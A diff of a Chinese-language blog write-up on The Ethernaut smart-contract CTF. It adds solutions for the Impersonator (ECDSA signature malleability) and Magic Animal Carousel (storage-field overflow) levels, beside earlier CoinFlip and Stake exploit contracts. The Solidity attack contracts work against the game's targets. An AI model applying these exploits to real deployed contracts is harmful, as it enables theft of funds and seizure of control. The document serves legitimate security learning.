@@ -26,15 +26,15 @@
 <meta property="og:site_name" content="Victifa">
 <meta property="og:description" content="The Ethernaut00. Hello Ethernaut 在控制台输入 await contract.info()，获得提示：&#x3D;&#x3D;You will find what you need in info1().&#x3D;&#x3D;  输入 await contract.info1()，得到&#x3D;&#x3D;Try info2(), but with “hello” as a parameter.&#x3D;&#x3D;，即以 “hello”">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/00/00.01.png">
-<meta property="og:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/00/00.02.png">
-<meta property="og:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/03/03.01.png">
-<meta property="og:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/09/09.01.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/Ethernaut/00/00.01.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/Ethernaut/00/00.02.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/Ethernaut/03/03.01.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/Ethernaut/08/08.01.png">
 <meta property="article:published_time" content="2025-03-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-04-12T12:01:40.772Z">
+<meta property="article:modified_time" content="2025-04-26T13:38:30.159Z">
 <meta property="article:author" content="Victifa">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/00/00.01.png">
+<meta name="twitter:image" content="http://example.com/2025/03/22/pics/Ethernaut/00/00.01.png">
   
   
   
@@ -239,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.2k 字
+          9.8k 字
         
       </span>
     
@@ -250,7 +250,7 @@
         
         
         
-          77 分钟
+          82 分钟
         
       </span>
     
@@ -299,7 +299,7 @@
 </li>
 <li><p>输入 <code>await contract.info2(&quot;hello&quot;)</code>，得到==The property infoNum holds the number of the next info method to call ”==</p>
 </li>
-<li><p>输入 <code>await contract.infoNum()</code>，查看详细数据，结果如下，说明下一个查看的是 <code>info42()</code>(宇宙的终极答案)<img src=".\pics\00\00.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>输入 <code>await contract.infoNum()</code>，查看详细数据，结果如下，说明下一个查看的是 <code>info42()</code>(宇宙的终极答案)<img src="../pics/Ethernaut/00/00.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 <li><p>输入 <code>await contract.info42()</code>，得到==theMethodName is the name of the next method.==，即下一个函数的名字为 <code>theMethodName（）</code></p>
 </li>
@@ -317,7 +317,7 @@
 <ul>
 <li>摊牌了，在最开始输入 <code>await contract</code> 时就获得了该关的所有函数，实际可以跳着走</li>
 </ul>
-<p><img src=".\pics\00\00.02.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="../pics/Ethernaut/00/00.02.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01. Fallback"></a>01. Fallback</h2><p>过关条件：</p>
 <ol>
 <li>获得这个合约的所有权</li>
@@ -356,7 +356,7 @@
 <h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>通过如下代码，一键计算并调用函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface CoinFlip &#123;<br>    function flip(bool _guess) external returns (bool);<br>&#125;<br><br>contract Coin &#123;<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>    address addr;<br>    constructor (address _addr) &#123;<br>        addr = _addr;<br>    &#125;<br>    function getNum() public &#123;<br>        uint256 blockValue = uint256(blockhash(block.number - 1));<br>        uint256 coinFlip = blockValue / FACTOR;<br>        bool side = coinFlip == 1 ? true : false;<br>        CoinFlip(addr).flip(side);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
 <p>调用两次后，调用 <code>getter</code> 函数 <code>await contract.consecutiveWins()</code>，结果如下：</p>
-<p><img src=".\pics\03\03.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="../pics/Ethernaut/03/03.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>正确，慢慢执行十次就行了。</p>
 <ul>
 <li>注：两次执行间要有一定间隔，否则会报错 <code>Gas estimation failed</code>。</li>
@@ -420,7 +420,7 @@
 <p>如果上一个变量没把槽占满，下一个变量又刚好塞得进去，那两个变量就塞一个槽里，直到剩余空间塞不下下一个变量。</p>
 <p>若变量 a 在槽1，变量 b 塞不进槽1，那么变量 b 就存在槽2（槽1的顺位）；此时变量 c 能塞进槽1，就和变量 a 一起存在槽1中，尽管变量的声明顺序为a, b, c。</p>
 <p>可以借助以下图示理解（<a target="_blank" rel="noopener" href="https://s.foresightnews.pro/article/detail/1511">来自这里</a>）</p>
-<p><img src="./pics/09/09.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="../pics/Ethernaut/08/08.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <ul>
 <li>详见<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html">官方文档</a>，或<a target="_blank" rel="noopener" href="https://s.foresightnews.pro/article/detail/1511">智能合约安全审计入门篇 —— 访问私有数据</a></li>
 </ul>
@@ -648,6 +648,19 @@
 <p>由于该合约所有的 <code>call</code> 都没有检查返回值（即检查 call 是否成功），我们就可以利用这一点，让它先 <code>totalStaked += amount</code>，然后失败地调用 <code>transferFrom()</code>，导致我们没有 WETH 转给该合约，而通过 <code>WETH</code> 合约（用 ERC20接口）可知，我们账户上并没有这种代币，因此， call 是必定失败的。因此，攻击合约就可以先 <code>approve()</code> 一个随便的值，然后再调用 <code>StakeWETH()</code> 把 <code>totalStaked</code> 加成一个很大的值。</p>
 <p>最后是第一个条件，我们直接通过攻击合约给它转一点 ETH 即可。</p>
 <h3 id="实现-17"><a href="#实现-17" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    IERC20 weth;<br>    Stake stake;<br>    // 传入 2 finney<br>    constructor(IERC20 _weth, Stake _stake) payable &#123;<br>        weth = _weth;<br>        stake = _stake;<br>    &#125;<br><br>    function squeezeDry() public &#123;<br>        // 在此之前，手动 stake 0.002 ETH (2000000000000000 wei)再取出<br>        weth.approve(address(stake), 10 ether);<br>        bool success = stake.StakeWETH(10 ether);<br>        require(!success, &quot;Succeed to stake weth&quot;);<br>        stake.StakeETH&#123;value: address(this).balance&#125;();<br>    &#125;<br><br>    function payback(address me) public &#123;<br>        uint256 amount = address(this).balance;<br>        (bool success, ) = me.call&#123;value: amount&#125;(&quot;&quot;);<br>        require(success, &quot;I&#x27;m done&quot;);<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="32-Impersonator"><a href="#32-Impersonator" class="headerlink" title="32. Impersonator"></a>32. Impersonator</h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>利用了签名用的椭圆曲线关于 x 轴对称的特点。根据 EIP-2，任意 <code>s &gt; secp256k1n/2</code>  的签名都应认为是非法的，因为对一组私钥的签名结果 <code>(v1, r1, s1)</code>，把 v 和 s 改一改（v：27 -&gt; 28 或 28 -&gt; 27，s2 = n - s1）生成的 <code>(v2, r1, s2)</code>，通过 <code>ecrecover()</code> 得到的公钥地址（签名的地址）是一样的。</p>
+<p>因此，使用签名时应严格限制 <code>0 &lt; s &lt; n/2</code>。</p>
+<p>通过在 Etherscan 上查询事件 NewLock，我们可以得到 signature：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1932</span>cb<span class="hljs-number">842</span>d<span class="hljs-number">3e27</span>f<span class="hljs-number">54</span>f<span class="hljs-number">79</span>f<span class="hljs-number">7</span>be<span class="hljs-number">0289437381</span>ba<span class="hljs-number">2410</span>fdefbae<span class="hljs-number">36850</span>bee<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">41e3</span>b<span class="hljs-number">91</span><br><span class="hljs-number">78489</span><span class="hljs-keyword">c</span><span class="hljs-number">64</span>a<span class="hljs-number">0</span>db<span class="hljs-number">16</span><span class="hljs-keyword">c</span><span class="hljs-number">40</span>ef<span class="hljs-number">986</span>beccc<span class="hljs-number">8</span>f<span class="hljs-number">069</span>ad<span class="hljs-number">5041e5</span>b<span class="hljs-number">992</span>d<span class="hljs-number">76</span>fe<span class="hljs-number">76</span>bba<span class="hljs-number">057</span>d<span class="hljs-number">9</span>abff<span class="hljs-number">2</span><br><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000001</span>b<br></code></pre></td></tr></table></figure>
+<p>根据 <code>ECLocker</code> 合约中的构造函数，我们可以发现第一行是 r，第二行是 s，第三行是 v，然后计算第二组合法的数即可。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">就这三行：<br><span class="hljs-function"><span class="hljs-title">mstore</span><span class="hljs-params">(add(ptr, <span class="hljs-number">32</span>)</span></span>, <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(_signature, <span class="hljs-number">0</span>x60))) <span class="hljs-comment">// 32 byte v</span><br><span class="hljs-function"><span class="hljs-title">mstore</span><span class="hljs-params">(add(ptr, <span class="hljs-number">64</span>)</span></span>, <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(_signature, <span class="hljs-number">0</span>x20))) <span class="hljs-comment">// 32 bytes r</span><br><span class="hljs-function"><span class="hljs-title">mstore</span><span class="hljs-params">(add(ptr, <span class="hljs-number">96</span>)</span></span>, <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(_signature, <span class="hljs-number">0</span>x40))) <span class="hljs-comment">// 32 bytes s</span><br></code></pre></td></tr></table></figure></p>
+<h3 id="实现-18"><a href="#实现-18" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;<br>    bytes32 s1 = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;<br>    uint8 v1 = 0x1b;<br>    ECLocker lock;<br>    constructor(ECLocker _lock) &#123;<br>        lock = _lock;<br>    &#125;<br><br>    function break_lock() external &#123;<br>        uint8 v2 = 0x1c;<br>        bytes32 s2 = get_s2(s1);<br>        lock.changeController(v2, r, s2, address(0));<br><br>    &#125;<br><br>    function get_s2(bytes32 _s1) public pure returns (bytes32 s2) &#123;<br>        s2 = bytes32(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - uint256(_s1));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="33-Magic-Animal-Carousel"><a href="#33-Magic-Animal-Carousel" class="headerlink" title="33. Magic Animal Carousel"></a>33. Magic Animal Carousel</h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>首先来看那四个常量，再结合算式，虽然看不太懂，但可以大致猜测出 <code>carousel[i]</code> 的构成：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2  constant public MAX_CAPACITY = bytes2( type(uint16).max );<br>bytes32 constant public ANIMAL_MASK = bytes32( uint256(type(uint80).max) &lt;&lt; 160 + 16 ); <br>bytes32 constant public NEXT_ID_MASK = bytes32( uint256(type(uint16).max) &lt;&lt; 160 );<br>bytes32 constant public OWNER_MASK = bytes32( uint256(type(uint160).max) );<br><br>carousel[nextCrateId] = (carousel[nextCrateId] &amp; ~NEXT_ID_MASK) ^ (encodedAnimal &lt;&lt; 160 + 16)<br>            | ((nextCrateId + 1) % MAX_CAPACITY) &lt;&lt; 160 | uint160(msg.sender);<br>/**<br> * Animal mask:  0xffffffffffffffffffff00000000000000000000000000000000000000000000<br> * Next id mask: 0x00000000000000000000ffff0000000000000000000000000000000000000000<br> * Owner mask:   0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff<br> * Max capacity: 0x000000000000000000000000000000000000000000000000000000000000ffff<br> * carousel[i]:  10B animal name<br> *               2B  id<br> *               20B msg.sender <br>**/<br></code></pre></td></tr></table></figure></p>
+<p>再结合函数 <code>encodeAnimalName()</code>，对名字的限制是在 12 而非 10，显然可以给出一个长 12 的名字，直接覆盖到 id 的位子，考虑到 <code>MAX_CAPACITY</code> 是 <code>0xffff</code> ，最后 2B 直接就填这个。</p>
+<p>更改后再随便加一个新动物进去，就能把 <code>currentCrateId</code> 直接干到 <code>0xffff</code>，这样似乎就能过了。</p>
+<p>至于实际的通过条件，可以看一下它的检验手段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> function validateInstance(address payable _instance, address _player) public override returns (bool) &#123;<br>    _player;<br>    MagicAnimalCarousel instance = MagicAnimalCarousel(_instance);<br>    // Store a goat in the box<br>    string memory goat = &quot;Goat&quot;;<br>    instance.setAnimalAndSpin(goat);<br>        <br>    // Goat should be mutated<br>    uint256 currentCrateId = instance.currentCrateId();<br>    uint256 animalInBox = instance.carousel(currentCrateId) &gt;&gt; 176;<br>    uint256 goatEnc = uint256(bytes32(abi.encodePacked(goat))) &gt;&gt; 176;<br>    return animalInBox != goatEnc;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>似乎就是，原本 <code>carousel[currentCrateId]</code> 指向的是上次加进来的动物，经过我们的操作后，中间就有一大段 <code>FFFFF···</code> 没法通过 <code>&amp;</code> 消去，污染了结果。</p>
+<h3 id="实现-19"><a href="#实现-19" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    bytes2 constant public MAX_CAPACITY = bytes2( type(uint16).max );<br>    bytes32 constant public ANIMAL_MASK = bytes32( uint256(type(uint80).max) &lt;&lt; 160 + 16 ); <br>    bytes32 constant public NEXT_ID_MASK = bytes32( uint256(type(uint16).max) &lt;&lt; 160 );<br>    bytes32 constant public OWNER_MASK = bytes32( uint256(type(uint160).max) );<br>    /**<br>     * Animal mask:  0xffffffffffffffffffff00000000000000000000000000000000000000000000<br>     * Next id mask: 0x00000000000000000000ffff0000000000000000000000000000000000000000<br>     * Owner mask:   0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff<br>     * Max capacity: 0x000000000000000000000000000000000000000000000000000000000000ffff<br>     * carousel[i]:  10B animal name<br>     *               2B  id<br>     *               20B msg.sender <br>    **/<br>    MagicAnimalCarousel carousel;<br>    <br>    constructor(MagicAnimalCarousel _carousel) &#123;<br>        carousel = _carousel;<br>    &#125;<br>    <br>    function BreakTheRule() external &#123;<br>        carousel.setAnimalAndSpin(&quot;animal&quot;);<br>        bytes memory name = hex&quot;ffffffffffffffffffffFFFF&quot;;<br>        carousel.changeAnimal(string(name), 1);<br>        carousel.setAnimalAndSpin(&quot;AAA&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
                 
               </div>
